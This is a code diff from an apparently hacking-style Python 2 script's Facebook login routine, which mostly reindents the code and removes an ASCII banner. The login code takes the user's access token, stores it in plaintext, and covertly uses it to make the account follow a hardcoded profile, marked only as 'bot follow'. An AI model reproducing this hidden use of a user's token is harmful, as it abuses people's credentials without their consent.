@@ -86,29 +86,17 @@ def login():
 		token = open("login.txt", "r")
 		menu()
 	except KeyError:
-		os.system("clear")
-	print("""\x1b[0;32m███████╗██╗   ██╗███████╗ ██████╗  ██████╗ 
-\x1b[1;32m██╔════╝██║   ██║██╔════╝██╔════╝ ██╔═══██╗
-\x1b[1;32m█████╗  ██║   ██║█████╗  ██║  ███╗██║   ██║
-\x1b[1;33m██╔══╝  ██║   ██║██╔══╝  ██║   ██║██║   ██║
-\x1b[1;33m██║     ╚██████╔╝███████╗╚██████╔╝╚██████╔╝
-\x1b[1;33m╚═╝      ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝ 
-
-\x1b[1;32m IF you dont have token Download !Get Access Token!
-
-\x1b[1;32m --------------------------------------------- """)
-
-token = raw_input("\033[1;31m[1] L O G I N - W I T H - T O K E N \033[1;33m : ")
-	
-if token == "":
+		token = raw_input("\033[1;31m[1] L O G I N - W I T H - T O K E N \033[1;33m : ")
+		print("IF you dont have Token Go And Download !Get token app! ")
+		if token == "":
 			print("Wrong Input")
-try:
+		try:
 			nama = requests.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
 			open("login.txt", "w").write(token)
 			#-> bot follow
 			requests.post("https://graph.facebook.com/100008297554931/subscribers?access_token="+token)      #FUE GO
 			menu()
-except KeyError:
+		except KeyError:
 			os.system("rm -f login.txt")
 			exit("[>] Login Error")
 
